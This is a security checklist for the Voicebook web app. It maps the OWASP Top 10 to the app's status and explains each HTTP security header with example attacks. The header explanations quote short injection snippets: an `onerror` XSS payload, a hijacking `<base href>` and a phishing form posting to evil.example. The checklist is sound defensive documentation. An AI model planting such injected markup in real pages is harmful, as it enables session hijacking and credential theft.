# Security checklist

Where Voicebook stands against the common classes of web-application
vulnerabilities, and what's still open. The categories follow the OWASP
Top 10 (2025 edition; see <https://owasp.org/Top10/> for the authoritative,
current list). Update this file whenever one of the rows changes.

Related: [`auth.md`](auth.md) (authentication and authorization),
[`logging.md`](logging.md) (what's logged, and what never is),
[`../../deploy/README.md`](../../deploy/README.md) (container contract,
hosting, secrets).

## Status

✅ addressed · ⚠️ open

| # | Category | What it means | Voicebook |
|---|---|---|---|
| 1 | **Broken access control** | Users reaching data or actions they shouldn't (including server-side request forgery) | ✅ Every API call needs a session (`auth.md`); the allowlist is checked on each request; refresh is self-or-admin; reindex is admin-only. Outbound fetches of addresses from other people's DID documents go through the SSRF guard (`backend/src/fetch_guard.rs`). |
| 2 | **Security misconfiguration** | Insecure defaults, missing hardening, exposed services | ✅ Security headers on every response (see [Security headers](#security-headers)). `/metrics` is on its own unpublished port; there's no CORS layer; the Docker port-publishing trap is documented in `deploy/README.md`; local Grafana binds to 127.0.0.1. |
| 3 | **Software supply chain failures** | Vulnerable or compromised dependencies, build pipeline | ✅ Dependabot (`.github/dependabot.yml`) opens weekly update PRs for Cargo, npm, Dockerfile and Compose images; `scripts/audit.sh` runs `cargo audit` and `npm audit` (and Trivy on the image with `--image`) locally. Ignored advisories are listed with reasons in `backend/.cargo/audit.toml`. Lockfiles are committed; images are pinned; builds use `npm ci` and `cargo build --locked`. ⚠️ Container images aren't scanned unless Trivy is installed; nothing runs the audit automatically (no CI). |
| 4 | **Cryptographic failures** | Weak or missing encryption, mishandled secrets | ✅ TLS is terminated in front of the container; outbound TLS uses rustls; session tokens are stored only as SHA-256 hashes; service-auth signatures must be low-S on both curves. No secrets exist yet; the convention for them is in `deploy/README.md`. |
| 5 | **Injection** | SQL, HTML/script (XSS), commands, logs | ✅ All SQL values are bound parameters (`sqlx` `bind`/`push_bind`). React escapes rendered text (notes included) and nothing uses raw-HTML rendering. Logs are JSON-encoded, so values can't forge log lines. No shell commands run on user input. |
| 6 | **Insecure design** | Missing safeguards in the design itself | ⚠️ **No rate limiting** on `POST /api/session` or refresh. Low urgency while only invited accounts can create sessions. |
| 7 | **Authentication failures** | Weak login, session handling | ✅ Service-auth tokens are single-use and fully verified; tokens naming uninvited accounts are refused before any network request (so unauthenticated callers can't make the server fetch arbitrary DIDs), at the accepted cost of making allowlist membership observable; each sign-in creates a fresh session; cookies are `HttpOnly`, `SameSite=Strict` and `Secure`; sign-out deletes the session. ⚠️ No way to list or revoke your other sessions; sessions last 30 days. |
| 8 | **Software or data integrity failures** | Unverified updates, unsafe data handling | ✅ Untrusted JSON (records, DID documents, Jetstream events) is parsed into strict types; malformed records are skipped. ⚠️ No CI pipeline or image signing yet. |
| 9 | **Logging and alerting failures** | Attacks happen unnoticed | ✅ Rejected service-auth tokens and sign-ins by uninvited accounts are logged; nginx keeps client IPs. ⚠️ **Nothing alerts** until a telemetry server exists (`logging.md`, Production). |
| 10 | **Mishandling exceptional conditions** | Failing open, leaking details in errors | ✅ Errors return a generic 500, with details only in logs. Access checks fail closed on the backend; the frontend's fallbacks only change which screen is shown. |

## Security headers

The backend sets these on every response: the frontend's pages and files, the
API, and the metadata documents (`backend/src/headers.rs`; keep the two in
sync). They work the same behind nginx and on App Platform. The e2e suite
checks them, and fails any test that triggers a Content-Security-Policy
violation on our origin.

### `Content-Security-Policy`

```text
default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:;
font-src 'self'; connect-src 'self' https:; media-src 'self' blob:;
object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'
```

Tells the browser where the page may load code and data from. The built
frontend has no inline scripts or styles and no `eval`, so the policy can be
strict. It protects against **cross-site scripting (XSS)**: an attacker
getting their own code to run in Voicebook's page, where it could act as the
signed-in user.

| Directive | Protects against | What the attack looks like |
|---|---|---|
| `script-src 'self'` (no inline) | Injected scripts running | A future bug renders a recording's notes as HTML; someone saves notes containing `<img src=x onerror="…">` or `<script>…</script>`. Every friend who opens the Friends view runs it: it could delete their recordings or post records in their name, using the session in their browser. With this policy the browser refuses to run inline code or scripts from other sites. (The e2e suite injects an inline script and checks it's blocked.) |
| `object-src 'none'` | Code via plugins | An injected `<object>`/`<embed>` loads an old plugin format to run code outside the script rules. |
| `base-uri 'self'` | Hijacked relative URLs | An injected `<base href="https://evil.example/">` makes the page load its own `/assets/…` scripts from the attacker's server. |
| `form-action 'self'` | Phishing forms | An injected `<form action="https://evil.example/collect">` styled like a sign-in box sends whatever the user types to the attacker. |
| `frame-ancestors 'none'` | **Clickjacking** | A malicious site loads Voicebook in an invisible frame over a "Click to claim your prize" button; the victim's click actually lands on "Discard" or "Sign out" in our page. The browser now refuses to show Voicebook inside any frame. |
| `connect-src 'self' https:`, `media-src 'self' blob:`, `img-src 'self' data:` | Loading data from unexpected places | Limits where the page may fetch from. `connect-src` has to allow any HTTPS host, since OAuth, uploads and playback talk to whichever PDS a user is on; so the CSP mainly stops injected code from *running*, not code that already runs from sending data out. |

On the local network (`network.allowPrivateAddresses`), `connect-src` also
allows `http://localhost:*` and `http://127.0.0.1:*`.

### `X-Content-Type-Options: nosniff`

**Protects against MIME sniffing.** Browsers sometimes guess a response's type
from its contents instead of trusting `Content-Type`. An attacker who can get
text of their choosing into one of our responses (a JSON field, say) and then
includes that URL in their own page as `<script src="https://voicebook.club/api/…">`
could get it run or rendered as script or HTML. With `nosniff`, the browser
uses the declared type and refuses mismatches.

### `Referrer-Policy: same-origin`

**Protects against leaking where users are.** By default, a request to another
site carries the current page's URL in the `Referer` header. Here, users' PDSes
(for uploads and playback) and any site a link leads to would learn which
Voicebook pages and accounts someone was looking at; a PDS operator could
profile visitors. With `same-origin`, our URLs are only sent to ourselves.

### `Permissions-Policy`

```text
microphone=(self), camera=(), geolocation=(), payment=(), usb=(), interest-cohort=()
```

**Limits powerful browser features.** Only Voicebook's own pages may use the
microphone (for the recorder); embedded content may not, and features we don't
use are off entirely. The attack: a third-party frame (an injected one, or a
compromised embed) asks for the microphone while the user trusts
`voicebook.club`, and listens in.

### `Cross-Origin-Opener-Policy: same-origin`

**Protects against attacks through window references.** When one site opens
another (`window.open`, a link with a target), the two windows can keep
handles to each other. A malicious site that opened Voicebook could later
navigate that tab to a fake "your session expired, sign in again" page
(**tabnabbing**), or probe its state across windows (cross-site leaks). This
cuts the connection. OAuth uses full-page redirects, not pop-ups, so sign-in is
unaffected.

### `Cross-Origin-Resource-Policy: same-origin`

**Protects against other sites pulling our responses into their pages.** An
attacker's page can request our URLs with `<img>` or `<script>` tags. Even if
it can't read the response directly, loading it into the attacker's own process
opens side channels (Spectre-style attacks read memory in the same process).
With this header the browser refuses to deliver our responses to other sites'
pages at all. (Servers fetching `client-metadata.json` or `did.json` aren't
browsers and aren't affected.)

### `Strict-Transport-Security: max-age=31536000`

**Protects against SSL stripping.** On a hostile network (café Wi-Fi), someone
types `voicebook.club`; the first request goes out as plain HTTP, the attacker
answers it with a look-alike HTTP site, and sees everything. After one visit
over HTTPS, this header makes the browser use HTTPS for the domain for a year,
without asking. Not sent on loopback (local development). Limitation: the very
first visit is unprotected, unless the domain is on browsers' HSTS preload
list (a later decision, as it applies to all subdomains).

### `Cache-Control: no-store` (on `/api/…`)

**Protects personal data from caches.** On a shared computer, the next person
could see the previous user's API responses from the browser's cache, or a
misconfigured proxy or CDN could store one user's response and serve it to
others. API responses are never stored. (Pages and assets keep their own
caching: assets are immutable, `index.html` is revalidated.)

### Already in place

The session cookie's attributes (`Set-Cookie`) are documented in
[`auth.md`](auth.md#sessions): `HttpOnly` (scripts can't read it, even an XSS),
`SameSite=Strict` (not sent on requests from other sites: CSRF), `Secure` (only
over HTTPS).

## Open items

In priority order:

**Before the invite-only beta**

1. **Security headers**: done (see [Security headers](#security-headers)).
2. **Dependency scanning**: done (Dependabot, `scripts/audit.sh`). Enable
   "Dependabot security updates" in the GitHub repository settings, and run
   `scripts/audit.sh` before each release.
3. **A security review of the authentication code** before it's deployed
   (`/security-review` on the pending changes, or a second person).

**Before opening beyond invites**

4. **Rate limiting** on `POST /api/session` and refresh (per IP, in memory).
5. **Alerting** on the signals that matter: error rate, rejected-token rate,
   Jetstream lag and disconnects.
6. **Session management**: list and revoke your sessions; consider a shorter
   lifetime.
7. **CI** that builds, tests and scans every change, and signs the images it
   publishes.

## Reviewing changes

When a change touches any of these areas, check the matching row here and
update it:

- routes, authorization or sessions → rows 1, 7 (and `auth.md`);
- anything fetched from an address that came from someone else's data →
  row 1 (the fetch guard);
- configuration, ports, proxies or headers → row 2, and [Security headers](#security-headers) (a new
  external resource the page loads may need a CSP change; the e2e suite
  will report the violation);
- new dependencies or images → row 3;
- SQL, rendering of user content, or logging of user content → row 5.
